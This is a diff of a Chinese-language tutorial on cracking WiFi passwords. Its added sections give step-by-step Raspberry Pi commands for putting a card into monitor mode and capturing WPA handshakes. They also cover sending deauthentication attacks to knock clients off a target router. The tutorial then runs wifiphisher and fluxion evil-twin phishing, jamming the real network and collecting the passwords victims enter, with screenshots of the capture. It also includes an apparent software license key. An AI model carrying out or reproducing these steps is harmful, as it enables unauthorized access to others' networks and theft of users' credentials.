@@ -75,7 +75,7 @@ dmesg -T
 
 ```shell
 # 探测所有无线网络，抓取数据包
-airodump-ng wlan0mon
+airodump-ng wlan0
 ```
 
 有时候扫描不到WiFi，那就在虚拟机设置中拔出再插入USB网线网卡，然后从step1开始执行
@@ -234,6 +234,8 @@ hashcat -a 1 -m 22000 ./1880_1688381391.hc22000 -o wifi_passwd_result.txt mobile
 EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3
 ```
 
+[EWSA使用教程](https://www.key-iot.com/news/16479.html)
+
 导入cap格式的文件
 ![](resources/2023-07-04-02-18-15.png)
 
@@ -259,6 +261,31 @@ EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3
 ![](resources/2023-07-04-02-52-27.png)
 
 破解成功
+
+### 用树莓派（推荐）
+
+第一个终端：
+```shell
+su root
+# 如果网卡没有启动，就手动启动
+ifconfig wlan0 up
+# 把wlan0网卡切换到监听模式
+airmon-ng start wlan0
+# 杀掉可能影响监听的进程
+airmon-ng check kill
+# 扫描WiFi
+airodump-ng wlan0mon
+# 监听某个指定的WiFi并尝试抓取握手包，保存到当前目录
+airodump-ng wlan0mon -c [频道号] --bssid [路由器的mac地址] -w ./
+```
+
+第二个终端：
+```shell
+# 对指定目标发起deauth反认证包攻击
+aireplay-ng -0 [攻击次数] -a [路由器的mac地址] -c [连接设备的mac地址] wlan0mon
+```
+
+可多次攻击，等待第一个终端提示抓到握手包，之后流程与上面用kali虚拟机相同
 
 ## WiFiphisher 工具
 
@@ -293,6 +320,26 @@ apt install wifiphisher
 
 ### 用树莓派（推荐）
 
+```shell
+wifiphisher -i wlan0
+```
+
+选择一个被扫描到的WiFi
+![](resources/2023-07-11-23-13-30.png)
+
+选择钓鱼的方法，这里选择 4
+![](resources/2023-07-11-23-18-32.png)
+
+现在，原WiFi被干扰，连接不上，新出现了一个和原WiFi同名但是没有密码的WiFi
+被钓鱼用户连接上，就会弹出如下界面
+![](resources/2023-07-11-23-24-16.png)
+
+被钓鱼用户输入密码之后显示如下
+![](resources/2023-07-11-23-25-07.png)
+
+然后wifiphisher就拿到被钓鱼用户输入的密码（没做验证，不一定是正确的）
+![](resources/2023-07-11-23-21-19.png)
+
 ## Fluxion 工具
 
 钓鱼wifi的框架工具
@@ -317,7 +364,6 @@ apt install wifiphisher
 ### 网上教程
 
 [教程链接](https://www.freebuf.com/articles/wireless/283395.html)
-教程链接2
 
 ### 用kali虚拟机（不推荐）
 
@@ -467,44 +513,31 @@ chmod 777 dhcpd.leases
 
 ### 用树莓派（推荐）
 
+前面的步骤都相同，但是在树莓派的kali系统中，fluxion启动DHCP服务成功
+![](resources/2023-07-11-23-27-58.png)
 
+现在，原WiFi被干扰，连接不上，新出现了一个和原WiFi同名但是没有密码的WiFi
+被钓鱼用户连接上，就会弹出如下界面
+![](resources/2023-07-11-23-28-58.png)
 
+被钓鱼用户如果输入错误的密码（会做验证），显示如下
+![](resources/2023-07-11-23-31-45.png)
 
+被钓鱼用户如果输入正确的密码（会做验证），显示如下
+![](resources/2023-07-11-23-32-26.png)
 
+查看密码（经过fluxion验证是正确的）
+![](resources/2023-07-11-23-36-37.png)
 
-
-
-
-
-
-
----
-
-出现右上角的窗口代表钓鱼成功，密码保存的位置会显示
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+与wifiphisher相比，fluxion会验证别钓鱼者输入密码的正确性
 
 
 
 
 ---
----
+
+如果你运气比较好，对方有开放pin那最好了，最多半小时搞定。
 
 
-
-
-网卡找字典，做好长跑还未必跑的出来的准备。一般来说，字典越大，破解的几率越大，但耗时也越长。速度比较快的破解方式是hash码表，8位密码秒破，但现在的密码很少有8位的，并且生成hash码表比较耗时，更让人**的是一个essid只对应一个hash码表，也就是每个wifi信号都需要重新生成一次……。如果你运气比较好，对方有开放pin那最好了，最多半小时搞定。
 
 
